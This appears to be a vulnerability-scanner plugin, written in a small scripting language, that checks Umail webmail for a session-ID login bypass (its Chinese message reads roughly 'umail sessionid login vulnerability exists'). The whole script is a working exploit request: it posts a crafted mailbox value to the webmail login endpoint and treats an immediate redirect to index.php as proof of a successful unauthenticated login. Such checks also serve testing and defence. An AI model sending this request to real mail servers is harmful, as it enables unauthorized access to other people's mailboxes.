#request url = var
#define payload = /webmail/fast/index.php?module=operate&action=login
#define bug = <meta http-equiv="refresh" content="0; URL=index.php">
#define info = 存在umail sessionid登录漏洞
#define post = mailbox=test@domain.com&link=?

function main(args)
{
	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(StrFindStr(res[0],bug,0)!= "-1")
	{
		print(url.info);
	}
}
